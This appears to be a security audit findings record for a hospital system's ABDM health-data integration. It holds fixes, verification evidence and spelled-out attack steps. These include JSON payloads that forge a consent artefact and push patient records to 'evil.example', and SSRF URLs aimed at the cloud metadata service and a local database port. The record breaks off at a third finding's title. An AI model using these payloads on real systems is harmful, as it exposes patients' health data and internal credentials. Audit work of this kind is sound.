findings.failureScenario: Hospital runs `ABDM_ENABLED=1` with `ABDM_ENV=sandbox` (the default) and no ABDM_CALLBACK_HMAC_SECRET during onboarding. Attacker: (1) POST /api/abdm/v0.5/care-contexts/discover with a target's mobile/name → response leg returns real `careContextReference` values (abdmController.js:41-51); (2) POST /api/abdm/v0.5/consents/hip/notify with `{notification:{consentId:"attacker-1", status:"GRANTED", consentDetail:{careContexts:[<refs from step 1>], hiTypes:["OPConsultation","DischargeSummary","Prescription"], permission:{dataEraseAt:null}}}}` → a never-expiring GRANTED artefact is upserted; (3) POST /api/abdm/v0.5/health-information/hip/request with `{hiRequest:{consent:{id:"attacker-1"}, keyMaterial:{dhPublicKey:{keyValue:<attacker X25519 pubkey>}, nonce:<attacker nonce>}, dataPushUrl:"https://evil.example/collect"}}`. The HIS assembles the patient's notes, orders, investigations and discharge summaries into FHIR bundles, encrypts them TO THE ATTACKER'S KEY, and POSTs them to evil.example. Zero credentials used; only a 202 is visible in the hospital's logs.
findings.fixSketch: Invert the sandbox default in abdmSignature.js: require `callbackHmacSecret` whenever `ABDM.enabled` is true regardless of env (503 if unset) — never allow-on-missing-secret. Additionally: verify the CM's `signature` on the consent artefact (JWS against the CM's JWKS) before honouring it in consentHipNotify; refuse to upsert an artefact whose `hipId` !== ABDM.hipId; and treat `dataEraseAt: null` as a hard expiry default (e.g. grantedAt + 24h) rather than never-expires.
findings.verifyEvidence: Every cited line matches the code, and the full chain is exploitable. (1) routes/index.js:123 mounts /abdm/v0.5 via abdmCallbackRoutes.js:21 with only `requireAbdmEnabled, abdmSignature`; the global `authenticate` wall is at line 126, BELOW it. (2) abdmSignature.js:38-44 verbatim: if `!ABDM.callbackHmacSecret` and `ABDM.env !== "prod"` → console.warn + next() — allow-on-missing-secret. (3) config/abdm.js:27 `ENV = String(process.env.ABDM_ENV||"sandbox").trim().toLowerCase() === "prod" ? "prod" : "sandbox"` — any absent/typo'd value defaults to the permissive branch. (4) abdmController.js:97-115 upserts an artefact from body-only values with `status:"GRANTED"` hardcoded, `hipId: d.hip?.id || ABDM.hipId` (stored, never compared to this HIP), and `expiry: d.permission?.dataEraseAt || null`. (5) AbdmConsentArtefactModel.js:63-65 `isActive()` = `status==="GRANTED" && (!this.expiry || this.expiry > now)` — expiry null ⇒ true forever. (6) The `signature` field (model line 41-42, "for audit / non-repudiation") is written at abdmController.js:111 and grep across Backend/services/Abdm shows ZERO verification sites — it is write-only. (7) abdmController.js:139-148 looks the artefact up by the attacker's own consentId, passes isActive(), and calls pushHealthInformation with keyMaterial + dataPushUrl taken verbatim from the attacker body. (8) abdmDataFlowService.js:110-116 encrypts each FHIR bundle to `hiuKey.dhPublicKey.keyValue` (the attacker's X25519 key) and line 165 → abdmGateway.js…

findings.dimension: Data security — PHI exposure, injection, upload, IDOR/BOLA
findings.title: hiRequest.dataPushUrl is fetched with no scheme/host allowlist — SSRF from the ABDM callback body into the hospital's internal network
findings.mechanism: abdmDataFlowService.js:162-163 pulls `dataPushUrl` straight out of the inbound request body and only checks that it is truthy. abdmGateway.js:99 hands it to `_fetch` → global `fetch(url, ...)`. There is no `new URL()` parse, no `https:`-only check, no host allowlist against a registered HIU/bridge domain, no private-IP/loopback/link-local rejection, and no redirect cap. `_fetch` (abdmGateway.js:114-122) only adds an AbortController timeout. Unlike gwPost (abdmGateway.js:78) which is pinned to `ABDM.gatewayBaseUrl`, this leg is fully caller-directed.
findings.failureScenario: Even in a correctly-configured PROD deployment where the HMAC gate passes (a compromised/malicious registered HIU, or the gateway relaying a spoofed hiRequest), a POST to /api/abdm/v0.5/health-information/hip/request with `dataPushUrl: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"` or `"http://127.0.0.1:27017/"` makes the backend issue an attacker-directed POST from inside the VPC. Response status/body are recorded in the AbdmTransaction journal (abdmGateway.js:105-109, `endpoint: dataPushUrl`, `httpStatus`), giving a read-back oracle for internal port/host scanning. Chained with finding #1 (sandbox mode) the same primitive is reachable anonymously from the internet.
findings.fixSketch: In hiDataPush, parse with `new URL(dataPushUrl)`; reject unless `protocol === "https:"` and hostname matches an `ABDM_HIU_PUSH_HOST_ALLOWLIST` (or at minimum resolves to a public, non-RFC1918/loopback/link-local address — re-check post-DNS to defeat rebinding). Pass `redirect: "error"` to fetch. Do not journal the response body for this leg.
findings.verifyEvidence: CORE MECHANISM: CONFIRMED, exactly as described. Full untrusted chain verified end-to-end: 1. routes/ABDM/abdmCallbackRoutes.js:21,31 — `router.use(requireAbdmEnabled, abdmSignature)` then `router.post("/health-information/hip/request", ctrl.healthInfoHipRequest)`, mounted PRE-auth-wall (no JWT/RBAC). 2. controllers/Abdm/abdmController.js:130-131,147 — `const b = req.body||{}; const hiRequest = b.hiRequest||{};` … `hiRequest: { ..., dataPushUrl: hiRequest.dataPushUrl }`. Body value passed through with zero validation. 3. services/Abdm/abdmDataFlowService.js:162-163 — `const dataPushUrl = hiRequest?.dataPushUrl || hiRequest?.hiRequest?.dataPushUrl; if (!dataPushUrl) {...}` — truthiness check ONLY. 4. services/Abdm/abdmGateway.js:99 → `_fetch(dataPushUrl, {method:"POST",...})`; `_fetch` (114-122) adds only an AbortController timeout and calls global `fetch(url, {...opts, signal})`. Confirmed absent: no `new URL()` parse, no `https:`-only check, no host allowlist, no RFC1918/loopback/link-local rejection, no `redirect:"error"`. Contrast with `gwPost` (abdmGateway.js:67) which is pinned to `${ABDM.gatewayBaseUrl}${path}`. This leg is genuinely fully caller-directed — a real SSRF primitive. Sandbox reachability also holds: abdmSignature.js:38-44 calls `next()` with only a console.warn when `!ABDM.callbackHmacSecret && ABDM.env !== "prod"`. WHY DOWNGRADED — the stated impact is overstated on two counts: (a) NO READ-BACK ORACLE FOR RESPONSE BODY. The finding claims "Response status…

findings.dimension: Data security — PHI exposure, injection, upload, IDOR/BOLA
findings.title: POST /api/nursing-care-plans does `create(req.body)` unfiltered — any Nurse can forge a signed, locked NABH COP.1 care plan attributed to another nurse
